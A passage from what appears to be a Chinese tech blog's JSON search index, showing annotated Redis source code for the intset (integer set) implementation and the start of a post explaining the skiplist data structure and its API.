&#123; // 取出集合的编码方式 uint32_t encoding = intrev32ifbe(is-&gt;encoding); // 根据编码 ((Enc_t*)is-&gt;contents) 将数组转换回正确的类型 // 然后 ((Enc_t*)is-&gt;contents)[pos] 定位到数组索引上 // 接着 ((Enc_t*)is-&gt;contents)[pos] = value 将值赋给数组 // 最后， ((Enc_t*)is-&gt;contents)+pos 定位到刚刚设置的新值上 // 如果有需要的话， memrevEncifbe 将对值进行大小端转换 if (encoding == INTSET_ENC_INT64) &#123; ((int64_t*)is-&gt;contents)[pos] = value; memrev64ifbe(((int64_t*)is-&gt;contents)+pos); &#125; else if (encoding == INTSET_ENC_INT32) &#123; ((int32_t*)is-&gt;contents)[pos] = value; memrev32ifbe(((int32_t*)is-&gt;contents)+pos); &#125; else &#123; ((int16_t*)is-&gt;contents)[pos] = value; memrev16ifbe(((int16_t*)is-&gt;contents)+pos); &#125;&#125;/* Create an empty intset. * * 创建并返回一个新的空整数集合 * * T = O(1) */intset *intsetNew(void) &#123; // 为整数集合结构分配空间 intset *is = zmalloc(sizeof(intset)); // 设置初始编码 is-&gt;encoding = intrev32ifbe(INTSET_ENC_INT16); // 初始化元素数量 is-&gt;length = 0; return is;&#125;/* Resize the intset * * 调整整数集合的内存空间大小 * * 如果调整后的大小要比集合原来的大小要大， * 那么集合中原有元素的值不会被改变。 * * 返回值：调整大小后的整数集合 * * T = O(N) */static intset *intsetResize(intset *is, uint32_t len) &#123; // 计算数组的空间大小 uint32_t size = len*intrev32ifbe(is-&gt;encoding); // 根据空间大小，重新分配空间 // 注意这里使用的是 zrealloc ， // 所以如果新空间大小比原来的空间大小要大， // 那么数组原有的数据会被保留 is = zrealloc(is,sizeof(intset)+size); return is;&#125;/* Search for the position of \"value\". * * 在集合 is 的底层数组中查找值 value 所在的索引。 * * Return 1 when the value was found and * sets \"pos\" to the position of the value within the intset. * * 成功找到 value 时，函数返回 1 ，并将 *pos 的值设为 value 所在的索引。 * * Return 0 when the value is not present in the intset * and sets \"pos\" to the position where \"value\" can be inserted. * * 当在数组中没找到 value 时，返回 0 。 * 并将 *pos 的值设为 value 可以插入到数组中的位置。 * * T = O(log N) */static uint8_t intsetSearch(intset *is, int64_t value, uint32_t *pos) &#123; int min = 0, max = intrev32ifbe(is-&gt;length)-1, mid = -1; int64_t cur = -1; /* The value can never be found when the set is empty */ // 处理 is 为空时的情况 if (intrev32ifbe(is-&gt;length) == 0) &#123; if (pos) *pos = 0; return 0; &#125; else &#123; /* Check for the case where we know we cannot find the value, * but do know the insert position. */ // 因为底层数组是有序的，如果 value 比数组中最后一个值都要大 // 那么 value 肯定不存在于集合中， // 并且应该将 value 添加到底层数组的最末端 if (value &gt; _intsetGet(is,intrev32ifbe(is-&gt;length)-1)) &#123; if (pos) *pos = intrev32ifbe(is-&gt;length); return 0; // 因为底层数组是有序的，如果 value 比数组中最前一个值都要小 // 那么 value 肯定不存在于集合中， // 并且应该将它添加到底层数组的最前端 &#125; else if (value &lt; _intsetGet(is,0)) &#123; if (pos) *pos = 0; return 0; &#125; &#125; // 在有序数组中进行二分查找 // T = O(log N) while(max &gt;= min) &#123; mid = (min+max)/2; cur = _intsetGet(is,mid); if (value &gt; cur) &#123; min = mid+1; &#125; else if (value &lt; cur) &#123; max = mid-1; &#125; else &#123; break; &#125; &#125; // 检查是否已经找到了 value if (value == cur) &#123; if (pos) *pos = mid; return 1; &#125; else &#123; if (pos) *pos = min; return 0; &#125;&#125;/* Upgrades the intset to a larger encoding and inserts the given integer. * * 根据值 value 所使用的编码方式，对整数集合的编码进行升级， * 并将值 value 添加到升级后的整数集合中。 * * 返回值：添加新元素之后的整数集合 * * T = O(N) */static intset *intsetUpgradeAndAdd(intset *is, int64_t value) &#123; // 当前的编码方式 uint8_t curenc = intrev32ifbe(is-&gt;encoding); // 新值所需的编码方式 uint8_t newenc = _intsetValueEncoding(value); // 当前集合的元素数量 int length = intrev32ifbe(is-&gt;length); // 根据 value 的值，决定是将它添加到底层数组的最前端还是最后端 // 注意，因为 value 的编码比集合原有的其他元素的编码都要大 // 所以 value 要么大于集合中的所有元素，要么小于集合中的所有元素 // 因此，value 只能添加到底层数组的最前端或最后端 int prepend = value &lt; 0 ? 1 : 0; /* First set new encoding and resize */ // 更新集合的编码方式 is-&gt;encoding = intrev32ifbe(newenc); // 根据新编码对集合（的底层数组）进行空间调整 // T = O(N) is = intsetResize(is,intrev32ifbe(is-&gt;length)+1); /* Upgrade back-to-front so we don't overwrite values. * Note that the \"prepend\" variable is used to make sure we have an empty * space at either the beginning or the end of the intset. */ // 根据集合原来的编码方式，从底层数组中取出集合元素 // 然后再将元素以新编码的方式添加到集合中 // 当完成了这个步骤之后，集合中所有原有的元素就完成了从旧编码到新编码的转换 // 因为新分配的空间都放在数组的后端，所以程序先从后端向前端移动元素 // 举个例子，假设原来有 curenc 编码的三个元素，它们在数组中排列如下： // | x | y | z | // 当程序对数组进行重分配之后，数组就被扩容了（符号 ？ 表示未使用的内存）： // | x | y | z | ? | ? | ? | // 这时程序从数组后端开始，重新插入元素： // | x | y | z | ? | z | ? | // | x | y | y | z | ? | // | x | y | z | ? | // 最后，程序可以将新元素添加到最后 ？ 号标示的位置中： // | x | y | z | new | // 上面演示的是新元素比原来的所有元素都大的情况，也即是 prepend == 0 // 当新元素比原来的所有元素都小时（prepend == 1），调整的过程如下： // | x | y | z | ? | ? | ? | // | x | y | z | ? | ? | z | // | x | y | z | ? | y | z | // | x | y | x | y | z | // 当添加新值时，原本的 | x | y | 的数据将被新值代替 // | new | x | y | z | // T = O(N) while(length--) _intsetSet(is,length+prepend,_intsetGetEncoded(is,length,curenc)); /* Set the value at the beginning or the end. */ // 设置新值，根据 prepend 的值来决定是添加到数组头还是数组尾 if (prepend) _intsetSet(is,0,value); else _intsetSet(is,intrev32ifbe(is-&gt;length),value); // 更新整数集合的元素数量 is-&gt;length = intrev32ifbe(intrev32ifbe(is-&gt;length)+1); return is;&#125;/* * 向前或先后移动指定索引范围内的数组元素 * * 函数名中的 MoveTail 其实是一个有误导性的名字， * 这个函数可以向前或向后移动元素， * 而不仅仅是向后 * * 在添加新元素到数组时，就需要进行向后移动， * 如果数组表示如下（？表示一个未设置新值的空间）： * | x | y | z | ? | * |&lt;-----&gt;| * 而新元素 n 的 pos 为 1 ，那么数组将移动 y 和 z 两个元素 * | x | y | y | z | * |&lt;-----&gt;| * 接着就可以将新元素 n 设置到 pos 上了： * | x | n | y | z | * * 当从数组中删除元素时，就需要进行向前移动， * 如果数组表示如下，并且 b 为要删除的目标： * | a | b | c | d | * |&lt;-----&gt;| * 那么程序就会移动 b 后的所有元素向前一个元素的位置， * 从而覆盖 b 的数据： * | a | c | d | d | * |&lt;-----&gt;| * 最后，程序再从数组末尾删除一个元素的空间： * | a | c | d | * 这样就完成了删除操作。 * * T = O(N) */static void intsetMoveTail(intset *is, uint32_t from, uint32_t to) &#123; void *src, *dst; // 要移动的元素个数 uint32_t bytes = intrev32ifbe(is-&gt;length)-from; // 集合的编码方式 uint32_t encoding = intrev32ifbe(is-&gt;encoding); // 根据不同的编码 // src = (Enc_t*)is-&gt;contents+from 记录移动开始的位置 // dst = (Enc_t*)is_.contents+to 记录移动结束的位置 // bytes *= sizeof(Enc_t) 计算一共要移动多少字节 if (encoding == INTSET_ENC_INT64) &#123; src = (int64_t*)is-&gt;contents+from; dst = (int64_t*)is-&gt;contents+to; bytes *= sizeof(int64_t); &#125; else if (encoding == INTSET_ENC_INT32) &#123; src = (int32_t*)is-&gt;contents+from; dst = (int32_t*)is-&gt;contents+to; bytes *= sizeof(int32_t); &#125; else &#123; src = (int16_t*)is-&gt;contents+from; dst = (int16_t*)is-&gt;contents+to; bytes *= sizeof(int16_t); &#125; // 进行移动 // T = O(N) memmove(dst,src,bytes);&#125;/* Insert an integer in the intset * * 尝试将元素 value 添加到整数集合中。 * * *success 的值指示添加是否成功： * - 如果添加成功，那么将 *success 的值设为 1 。 * - 因为元素已存在而造成添加失败时，将 *success 的值设为 0 。 * * T = O(N) */intset *intsetAdd(intset *is, int64_t value, uint8_t *success) &#123; // 计算编码 value 所需的长度 uint8_t valenc = _intsetValueEncoding(value); uint32_t pos; // 默认设置插入为成功 if (success) *success = 1; /* Upgrade encoding if necessary. If we need to upgrade, we know that * this value should be either appended (if &gt; 0) or prepended (if &lt; 0), * because it lies outside the range of existing values. */ // 如果 value 的编码比整数集合现在的编码要大 // 那么表示 value 必然可以添加到整数集合中 // 并且整数集合需要对自身进行升级，才能满足 value 所需的编码 if (valenc &gt; intrev32ifbe(is-&gt;encoding)) &#123; /* This always succeeds, so we don't need to curry *success. */ // T = O(N) return intsetUpgradeAndAdd(is,value); &#125; else &#123; // 运行到这里，表示整数集合现有的编码方式适用于 value /* Abort if the value is already present in the set. * This call will populate \"pos\" with the right position to insert * the value when it cannot be found. */ // 在整数集合中查找 value ，看他是否存在： // - 如果存在，那么将 *success 设置为 0 ，并返回未经改动的整数集合 // - 如果不存在，那么可以插入 value 的位置将被保存到 pos 指针中 // 等待后续程序使用 if (intsetSearch(is,value,&amp;pos)) &#123; if (success) *success = 0; return is; &#125; // 运行到这里，表示 value 不存在于集合中 // 程序需要将 value 添加到整数集合中 // 为 value 在集合中分配空间 is = intsetResize(is,intrev32ifbe(is-&gt;length)+1); // 如果新元素不是被添加到底层数组的末尾 // 那么需要对现有元素的数据进行移动，空出 pos 上的位置，用于设置新值 // 举个例子 // 如果数组为： // | x | y | z | ? | // |&lt;-----&gt;| // 而新元素 n 的 pos 为 1 ，那么数组将移动 y 和 z 两个元素 // | x | y | y | z | // |&lt;-----&gt;| // 这样就可以将新元素设置到 pos 上了： // | x | n | y | z | // T = O(N) if (pos &lt; intrev32ifbe(is-&gt;length)) intsetMoveTail(is,pos,pos+1); &#125; // 将新值设置到底层数组的指定位置中 _intsetSet(is,pos,value); // 增一集合元素数量的计数器 is-&gt;length = intrev32ifbe(intrev32ifbe(is-&gt;length)+1); // 返回添加新元素后的整数集合 return is; /* p.s. 上面的代码可以重构成以下更简单的形式： if (valenc &gt; intrev32ifbe(is-&gt;encoding)) &#123; return intsetUpgradeAndAdd(is,value); &#125; if (intsetSearch(is,value,&amp;pos)) &#123; if (success) *success = 0; return is; &#125; else &#123; is = intsetResize(is,intrev32ifbe(is-&gt;length)+1); if (pos &lt; intrev32ifbe(is-&gt;length)) intsetMoveTail(is,pos,pos+1); _intsetSet(is,pos,value); is-&gt;length = intrev32ifbe(intrev32ifbe(is-&gt;length)+1); return is; &#125; */&#125;/* Delete integer from intset * * 从整数集合中删除值 value 。 * * *success 的值指示删除是否成功： * - 因值不存在而造成删除失败时该值为 0 。 * - 删除成功时该值为 1 。 * * T = O(N) */intset *intsetRemove(intset *is, int64_t value, int *success) &#123; // 计算 value 的编码方式 uint8_t valenc = _intsetValueEncoding(value); uint32_t pos; // 默认设置标识值为删除失败 if (success) *success = 0; // 当 value 的编码大小小于或等于集合的当前编码方式（说明 value 有可能存在于集合） // 并且 intsetSearch 的结果为真，那么执行删除 // T = O(log N) if (valenc &lt;= intrev32ifbe(is-&gt;encoding) &amp;&amp; intsetSearch(is,value,&amp;pos)) &#123; // 取出集合当前的元素数量 uint32_t len = intrev32ifbe(is-&gt;length); /* We know we can delete */ // 设置标识值为删除成功 if (success) *success = 1; /* Overwrite value with tail and update length */ // 如果 value 不是位于数组的末尾 // 那么需要对原本位于 value 之后的元素进行移动 // // 举个例子，如果数组表示如下，而 b 为删除的目标 // | a | b | c | d | // 那么 intsetMoveTail 将 b 之后的所有数据向前移动一个元素的空间， // 覆盖 b 原来的数据 // | a | c | d | d | // 之后 intsetResize 缩小内存大小时， // 数组末尾多出来的一个元素的空间将被移除 // | a | c | d | if (pos &lt; (len-1)) intsetMoveTail(is,pos+1,pos); // 缩小数组的大小，移除被删除元素占用的空间 // T = O(N) is = intsetResize(is,len-1); // 更新集合的元素数量 is-&gt;length = intrev32ifbe(len-1); &#125; return is;&#125;/* Determine whether a value belongs to this set * * 检查给定值 value 是否集合中的元素。 * * 是返回 1 ，不是返回 0 。 * * T = O(log N) */uint8_t intsetFind(intset *is, int64_t value) &#123; // 计算 value 的编码 uint8_t valenc = _intsetValueEncoding(value); // 如果 value 的编码大于集合的当前编码，那么 value 一定不存在于集合 // 当 value 的编码小于等于集合的当前编码时， // 才再使用 intsetSearch 进行查找 return valenc &lt;= intrev32ifbe(is-&gt;encoding) &amp;&amp; intsetSearch(is,value,NULL);&#125;/* Return random member * * 从整数集合中随机返回一个元素 * * 只能在集合非空时使用 * * T = O(1) */int64_t intsetRandom(intset *is) &#123; // intrev32ifbe(is-&gt;length) 取出集合的元素数量 // 而 rand() % intrev32ifbe(is-&gt;length) 根据元素数量计算一个随机索引 // 然后 _intsetGet 负责根据随机索引来查找值 return _intsetGet(is,rand()%intrev32ifbe(is-&gt;length));&#125;/* Sets the value to the value at the given position. When this position is * out of range the function returns 0, when in range it returns 1. *//* * 取出集合底层数组指定位置中的值，并将它保存到 value 指针中。 * * 如果 pos 没超出数组的索引范围，那么返回 1 ，如果超出索引，那么返回 0 。 * * p.s. 上面原文的文档说这个函数用于设置值，这是错误的。 * * T = O(1) */uint8_t intsetGet(intset *is, uint32_t pos, int64_t *value) &#123; // pos &lt; intrev32ifbe(is-&gt;length) // 检查 pos 是否符合数组的范围 if (pos &lt; intrev32ifbe(is-&gt;length)) &#123; // 保存值到指针 *value = _intsetGet(is,pos); // 返回成功指示值 return 1; &#125; // 超出索引范围 return 0;&#125;/* Return intset length * * 返回整数集合现有的元素个数 * * T = O(1) */uint32_t intsetLen(intset *is) &#123; return intrev32ifbe(is-&gt;length);&#125;/* Return intset blob size in bytes. * * 返回整数集合现在占用的字节总数量 * 这个数量包括整数集合的结构大小，以及整数集合所有元素的总大小 * * T = O(1) */size_t intsetBlobLen(intset *is) &#123; return sizeof(intset)+intrev32ifbe(is-&gt;length)*intrev32ifbe(is-&gt;encoding);&#125;","path":"2019/04/21/redis源码-整数集合/","date":"04-21","excerpt":"整数集合整数集合是集合键的底层实现之一， 当一个集合只包含整数值元素，并且这个集合的元素数量不多时，redis会使用整数集合键实现整数集合的实现整数集合是用于保存整数值的集合抽象数据结构，可以保存int16_t / int32_t / int64_t的整数值123456789101112typedef struct intset &#123; // 编码方式 uint32_t encoding; // 集合包含的元素数量 uint32_t length; // 保存元素的数组 int8_t contents[];&#125; intset;","tags":[{"name":"源码","slug":"源码","permalink":"https://jijiking51.cn/tags/源码/"}],"preview":"http://img.jijiking51.cn/redis-整数集合.jpg"},{"title":"redis源码-skiplist","text":"跳跃表概念跳跃表是一种有序数据结构，他通过在每个节点中维持多个指向其他节点的指针，从而达到快速访问的目的。跳跃表支持平均O(logN)、最坏O(N)复杂度的节点查找，还可以通过顺序性操作来批量处理节点。Redis使用跳跃表作为有序集合键的底层实现之一，如果一个有序集合包含的元素数量比较多，又或者有序集合中元素的成员是比较长的字符串时，redis就会使用跳跃表作为有序集合键的底层实现。redis只有两个地方使用了跳跃表，一个是实现有序集合键，另一个是在集群节点中用作内部数据结构。 跳跃表的实现1234567891011121314151617181920212223242526/* * 跳跃表节点 */typedef struct zskiplistNode &#123; // 成员对象 robj *obj; // 分值 double score; // 后退指针 struct zskiplistNode *backward; // 层 struct zskiplistLevel &#123; // 前进指针 struct zskiplistNode *forward; // 跨度 unsigned int span; &#125; level[];&#125; zskiplistNode; level: 节点中的层，可以有多个层，每个层都有两个属性，前进指针和跨度。前进指针用于访问位于表尾方向的其他节点，而跨度则记录了前进指针所指向节点和当前节点的距离。当程序从头表进行遍历的时候，访问会沿着层的前进指针进行。 一般来说，层数越多，访问其他节点速度就越快，每次创建一个新的跳跃表的时候，程序都根据幂次定律（越大的数出现几率越小）随机生成一个1-32的值作为level数组大小，这个数就是层的高度 每个层都有一个指向表尾方向的前进指针 迭代程序首先访问跳跃表的第一个节点（表头）， 然后从第四层的前进指针移动到表中的第二个节点。 在第二个节点时， 程序沿着第二层的前进指针移动到表中的第三个节点。 在第三个节点时， 程序同样沿着第二层的前进指针移动到表中的第四个节点。 当程序再次沿着第四个节点的前进指针移动时， 它碰到一个 NULL ， 程序知道这时已经到达了跳跃表的表尾， 于是结束这次遍历。 层的跨度用于记录两个节点之间的距离：两个节点之间的跨度越大， 它们相距得就越远。指向 NULL 的所有前进指针的跨度都为 0 ， 因为它们没有连向任何节点。初看上去， 很容易以为跨度和遍历操作有关， 但实际上并不是这样,遍历操作只使用前进指针就可以完成了， 跨度实际上是用来计算排位（rank）的： 在查找某个节点的过程中， 将沿途访问过的所有层的跨度累计起来， 得到的结果就是目标节点在跳跃表中的排位。 举个例子， 下图用虚线标记了在跳跃表中查找分值为 3.0 、 成员对象为 o3 的节点时， 沿途经历的层： 查找的过程只经过了一个层， 并且层的跨度为 3 ， 所以目标节点在跳跃表中的排位为 3 。 backward: 节点中指向位于当前节点的前一个节点。后退指针在程序从表尾向表头遍历时使用 倒数第四个是头表，不包含对象 score: 各个节点中保存的分值，节点按照分值从小到大排列 obj: 各个节点保存的成员对象，指向一个字符串对象，而字符串对象则保存一个SDS值 同一个跳跃表中，保存的成员对象是唯一的，但是多个节点保存的分值可以相同，分值相同的节点将按照成员对象在字典序中的大小来进行排序，成员对象小的将会靠近表头方向（从小到大)例如：o1&lt;=o2&lt;=o3 分值相同的情况下排序如下 123456789101112131415/* * 跳跃表 */typedef struct zskiplist &#123; // 表头节点和表尾节点 struct zskiplistNode *header, *tail; // 表中节点的数量 unsigned long length; // 表中层数最大的节点的层数 int level;&#125; zskiplist; header: 指向跳跃表的表头节点 tail: 指向跳跃表的表尾节点 level: 记录目前跳跃表内，层数最大的那个节点的层数(表头节点的层数不计算在内) length: 记录跳跃表的长度，跳跃表目前包含节点的数量(表头节点不计算在内) 跳跃表API常用API 函数 作用 时间复杂度 zslCreate 创建一个新的跳跃表。 O(1) zslFree 释放给定跳跃表，以及表中包含的所有节点。 O(N) ， N 为跳跃表的长度。 zslInsert 将包含给定成员和分值的新节点添加到跳跃表中。 平均 O(N) ， N 为跳跃表长度。 zslDelete 删除跳跃表中包含给定成员和分值的节点。 平均 O(N) ， N 为跳跃表长度。 zslGetRank 返回包含给定成员和分值的节点在跳跃表中的排位。 平均 O(N) ， N 为跳跃表长度。 zslGetElementByRank 返回跳跃表在给定排位上的节点。 平均 O(N) ， N 为跳跃表长度。 zslIsInRange 给定一个分值范围（range）， 比如 0 到 15 ， 20 到 28，诸如此类， 如果给定的分值范围包含在跳跃表的分值范围之内， 那么返回 1 ，否则返回 0 。 通过跳跃表的表头节点和表尾节点， 这个检测可以用 O(1) 复杂度完成。 zslFirstInRange 给定一个分值范围， 返回跳跃表中第一个符合这个范围的节点。 平均 O(N) 。 N 为跳跃表长度。 zslLastInRange 给定一个分值范围， 返回跳跃表中最后一个符合这个范围的节点。 平均 O(N) 。 N 为跳跃表长度。 zslDeleteRangeByScore 给定一个分值范围， 删除跳跃表中所有在这个范围之内的节点。 O(N) ， N 为被删除节点数量。 zslDeleteRangeByRank 给定一个排位范围， 删除跳跃表中所有在这个范围之内的节点。 O(N) ， N 为被删除节点数量。 API注解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400401402403404405406407408409410411412413414415416417418419420421422423424425426427428429430431432433434435436437438439440441442443444445446447448449450451452453454455456457458459460461462463464465466467468469470471472473474475476477478479480481482483484485486487488489490491492493494495496497498499500501502503504505506507508509510511512513514515516517518519520521522523524525526527528529530531532533534535536537538539540541542543544545546547548549550551552553554555556557558559560561562563564565566567568569570571572573574575576577578579580581582583584585586587588589590591592593594595596597598599600601602603604605606607608609610611612613614615616617618619620621622623624625626627628629630631632633634635636637638639640641642643644645646647648649650651652653654655656657658659660661662663664665666667668669670671672673674675676677678679680681682683684685686687688689690691692693694695696697698699700701702703704705706707708709710711712713714715716717718719720721722723724725726727728729730731732733734735736737738739/* * 创建一个层数为 level 的跳跃表节点， * 并将节点的成员对象设置为 obj ，分值设置为 score 。 * * 返回值为新创建的跳跃表节点 * * T = O(1) */zskiplistNode *zslCreateNode(int level, double score, robj *obj) &#123; // 分配空间 zskiplistNode *zn = zmalloc(sizeof(*zn)+level*sizeof(struct zskiplistLevel)); // 设置属性 zn-&gt;score = score; zn-&gt;obj = obj; return zn;&#125;/* * 创建并返回一个新的跳跃表 * * T = O(1) */zskiplist *zslCreate(void) &#123; int j; zskiplist *zsl; // 分配空间 zsl = zmalloc(sizeof(*zsl)); // 设置高度和起始层数 zsl-&gt;level = 1; zsl-&gt;length = 0; // 初始化表头节点 // T = O(1) zsl-&gt;header = zslCreateNode(ZSKIPLIST_MAXLEVEL,0,NULL); for (j = 0; j &lt; ZSKIPLIST_MAXLEVEL; j++) &#123; zsl-&gt;header-&gt;level[j].forward = NULL; zsl-&gt;header-&gt;level[j].span = 0; &#125; zsl-&gt;header-&gt;backward = NULL; // 设置表尾 zsl-&gt;tail = NULL; return zsl;&#125;/* * 释放给定的跳跃表节点 * * T = O(1) */void zslFreeNode(zskiplistNode *node) &#123; decrRefCount(node-&gt;obj); zfree(node);&#125;/* * 释放给定跳跃表，以及表中的所有节点 * * T = O(N) */void zslFree(zskiplist *zsl) &#123; zskiplistNode *node = zsl-&gt;header-&gt;level[0].forward, *next; // 释放表头 zfree(zsl-&gt;header); // 释放表中所有节点 // T = O(N) while(node) &#123; next = node-&gt;level[0].forward; zslFreeNode(node); node = next; &#125; // 释放跳跃表结构 zfree(zsl);&#125;/* Returns a random level for the new skiplist node we are going to create. * * 返回一个随机值，用作新跳跃表节点的层数。 * * The return value of this function is between 1 and ZSKIPLIST_MAXLEVEL * (both inclusive), with a powerlaw-alike distribution where higher * levels are less likely to be returned. * * 返回值介乎 1 和 ZSKIPLIST_MAXLEVEL 之间（包含 ZSKIPLIST_MAXLEVEL）， * 根据随机算法所使用的幂次定律，越大的值生成的几率越小。 * * T = O(N) */int zslRandomLevel(void) &#123; int level = 1; while ((random()&amp;0xFFFF) &lt; (ZSKIPLIST_P * 0xFFFF)) level += 1; return (level&lt;ZSKIPLIST_MAXLEVEL) ? level : ZSKIPLIST_MAXLEVEL;&#125;/* * 创建一个成员为 obj ，分值为 score 的新节点， * 并将这个新节点插入到跳跃表 zsl 中。 * * 函数的返回值为新节点。 * * T_wrost = O(N^2), T_avg = O(N log N) */zskiplistNode *zslInsert(zskiplist *zsl, double score, robj *obj) &#123; zskiplistNode *update[ZSKIPLIST_MAXLEVEL], *x; unsigned int rank[ZSKIPLIST_MAXLEVEL]; int i, level; redisAssert(!isnan(score)); // 在各个层查找节点的插入位置 // T_wrost = O(N^2), T_avg = O(N log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; /* store rank that is crossed to reach the insert position */ // 如果 i 不是 zsl-&gt;level-1 层 // 那么 i 层的起始 rank 值为 i+1 层的 rank 值 // 各个层的 rank 值一层层累积 // 最终 rank[0] 的值加一就是新节点的前置节点的排位 // rank[0] 会在后面成为计算 span 值和 rank 值的基础 rank[i] = i == (zsl-&gt;level-1) ? 0 : rank[i+1]; // 沿着前进指针遍历跳跃表 // T_wrost = O(N^2), T_avg = O(N log N) while (x-&gt;level[i].forward &amp;&amp; (x-&gt;level[i].forward-&gt;score &lt; score || // 比对分值 (x-&gt;level[i].forward-&gt;score == score &amp;&amp; // 比对成员， T = O(N) compareStringObjects(x-&gt;level[i].forward-&gt;obj,obj) &lt; 0))) &#123; // 记录沿途跨越了多少个节点 rank[i] += x-&gt;level[i].span; // 移动至下一指针 x = x-&gt;level[i].forward; &#125; // 记录将要和新节点相连接的节点 update[i] = x; &#125; /* we assume the key is not already inside, since we allow duplicated * scores, and the re-insertion of score and redis object should never * happen since the caller of zslInsert() should test in the hash table * if the element is already inside or not. * * zslInsert() 的调用者会确保同分值且同成员的元素不会出现， * 所以这里不需要进一步进行检查，可以直接创建新元素。 */ // 获取一个随机值作为新节点的层数 // T = O(N) level = zslRandomLevel(); // 如果新节点的层数比表中其他节点的层数都要大 // 那么初始化表头节点中未使用的层，并将它们记录到 update 数组中 // 将来也指向新节点 if (level &gt; zsl-&gt;level) &#123; // 初始化未使用层 // T = O(1) for (i = zsl-&gt;level; i &lt; level; i++) &#123; rank[i] = 0; update[i] = zsl-&gt;header; update[i]-&gt;level[i].span = zsl-&gt;length; &#125; // 更新表中节点最大层数 zsl-&gt;level = level; &#125; // 创建新节点 x = zslCreateNode(level,score,obj); // 将前面记录的指针指向新节点，并做相应的设置 // T = O(1) for (i = 0; i &lt; level; i++) &#123; // 设置新节点的 forward 指针 x-&gt;level[i].forward = update[i]-&gt;level[i].forward; // 将沿途记录的各个节点的 forward 指针指向新节点 update[i]-&gt;level[i].forward = x; /* update span covered by update[i] as x is inserted here */ // 计算新节点跨越的节点数量 x-&gt;level[i].span = update[i]-&gt;level[i].span - (rank[0] - rank[i]); // 更新新节点插入之后，沿途节点的 span 值 // 其中的 +1 计算的是新节点 update[i]-&gt;level[i].span = (rank[0] - rank[i]) + 1; &#125; /* increment span for untouched levels */ // 未接触的节点的 span 值也需要增一，这些节点直接从表头指向新节点 // T = O(1) for (i = level; i &lt; zsl-&gt;level; i++) &#123; update[i]-&gt;level[i].span++; &#125; // 设置新节点的后退指针 x-&gt;backward = (update[0] == zsl-&gt;header) ? NULL : update[0]; if (x-&gt;level[0].forward) x-&gt;level[0].forward-&gt;backward = x; else zsl-&gt;tail = x; // 跳跃表的节点计数增一 zsl-&gt;length++; return x;&#125;/* Internal function used by zslDelete, zslDeleteByScore and zslDeleteByRank * * 内部删除函数， * 被 zslDelete 、 zslDeleteRangeByScore 和 zslDeleteByRank 等函数调用。 * * T = O(1) */void zslDeleteNode(zskiplist *zsl, zskiplistNode *x, zskiplistNode **update) &#123; int i; // 更新所有和被删除节点 x 有关的节点的指针，解除它们之间的关系 // T = O(1) for (i = 0; i &lt; zsl-&gt;level; i++) &#123; if (update[i]-&gt;level[i].forward == x) &#123; update[i]-&gt;level[i].span += x-&gt;level[i].span - 1; update[i]-&gt;level[i].forward = x-&gt;level[i].forward; &#125; else &#123; update[i]-&gt;level[i].span -= 1; &#125; &#125; // 更新被删除节点 x 的前进和后退指针 if (x-&gt;level[0].forward) &#123; x-&gt;level[0].forward-&gt;backward = x-&gt;backward; &#125; else &#123; zsl-&gt;tail = x-&gt;backward; &#125; // 更新跳跃表最大层数（只在被删除节点是跳跃表中最高的节点时才执行） // T = O(1) while(zsl-&gt;level &gt; 1 &amp;&amp; zsl-&gt;header-&gt;level[zsl-&gt;level-1].forward == NULL) zsl-&gt;level--; // 跳跃表节点计数器减一 zsl-&gt;length--;&#125;/* Delete an element with matching score/object from the skiplist. * * 从跳跃表 zsl 中删除包含给定节点 score 并且带有指定对象 obj 的节点。 * * T_wrost = O(N^2), T_avg = O(N log N) */int zslDelete(zskiplist *zsl, double score, robj *obj) &#123; zskiplistNode *update[ZSKIPLIST_MAXLEVEL], *x; int i; // 遍历跳跃表，查找目标节点，并记录所有沿途节点 // T_wrost = O(N^2), T_avg = O(N log N) x = zsl-&gt;header; for (i = zsl-&gt;level-1; i &gt;= 0; i--) &#123; // 遍历跳跃表的复杂度为 T_wrost = O(N), T_avg = O(log N) while (x-&gt;level[i].forward &amp;&amp; (x-&gt;level[i].forward-&gt;score &lt; score || // 比对分值 (x-&gt;level[i].forward-&gt;score == score &amp;&amp; // 比对对象，T = O(N) compareStringObjects(x-&gt;level[i].forward-&gt;obj,obj) &lt; 0))) // 沿着前进指针移动 x = x-&gt;level[i].forward; // 记录沿途节点 update[i] = x; &#125; /* We may have multiple elements with the same score, what we need * is to find the element with both the right score and object. * * 检查找到的元素 x ，只有在它的分值和对象都相同时，才将它删除。 */ x = x-&gt;level[0].forward; if (x &amp;&amp; score == x-&gt;score &amp;&amp; equalStringObjects(x-&gt;obj,obj)) &#123; // T = O(1) zslDeleteNode(zsl, x, update); // T = O(1) zslFreeNode(x); return 1; &#125; else &#123; return 0; /* not found */ &#125; return 0; /* not found */&#125;/* * 检测给定值 value 是否大于（或大于等于）范围 spec 中的 min 项。 * * 返回 1 表示 value 大于等于 min 项，否则返回 0 。 * * T = O(1) */static int zslValueGteMin(double value, zrangespec *spec) &#123; return spec-&gt;minex ? (value &gt; spec-&gt;min) : (value &gt;= spec-&gt;min);&#125;/* * 检测给定值 value 是否小于（或小于等于）范围 spec 中的 max 项。 * * 返回 1 表示 value 小于等于 max 项，否则返回 0 。 * * T = O(1) */static int zslValueLteMax(double value, zrangespec *spec) &#123; return spec-&gt;maxex ? (value &lt; spec-&gt;max) : (value &lt;= spec-&gt;max);&#125;/* Returns if there is a part of the zset is in range. * * 如果给定的分值范围包含在跳跃表的分值范围之内， * 那么返回 1 ，否则返回 0 。 * * T = O(1) */int zslIsInRange(zskiplist *zsl, zrangespec *range) &#123; zskiplistNode *x; /* Test for ranges that will always be empty. */ // 先排除总为空的范围值 if (range-&gt;min &gt; range-&gt;max || (range-&gt;min == range-&gt;max &amp;&amp; (range-&gt;minex || range-&gt;maxex))) return 0; // 检查最大分值 x = zsl-&gt;tail; if (x == 